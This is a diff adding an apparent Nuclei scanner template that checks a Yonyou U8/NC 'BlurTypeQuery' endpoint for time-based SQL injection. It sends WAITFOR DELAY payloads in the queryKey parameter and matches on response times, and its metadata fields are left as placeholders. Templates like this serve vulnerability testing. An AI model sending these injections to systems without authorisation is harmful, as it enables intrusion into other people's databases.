@@ -1,0 +1,27 @@
+id: yonyou-u8-BlurTypeQuery-sqli
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/service/~iufo/nc.itf.iufo.mobilereport.data.BlurTypeQuery?usercode=5&queryKey=1');WAITFOR+DELAY+'0:0:3'--"
+      - "{{BaseURL}}/service/~iufo/nc.itf.iufo.mobilereport.data.BlurTypeQuery?usercode=5&queryKey=1');WAITFOR+DELAY+'0:0:6'--"
+      - "{{BaseURL}}/service/~iufo/nc.itf.iufo.mobilereport.data.BlurTypeQuery?usercode=5&queryKey=1');WAITFOR+DELAY+'0:0:9'--"
+
+
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
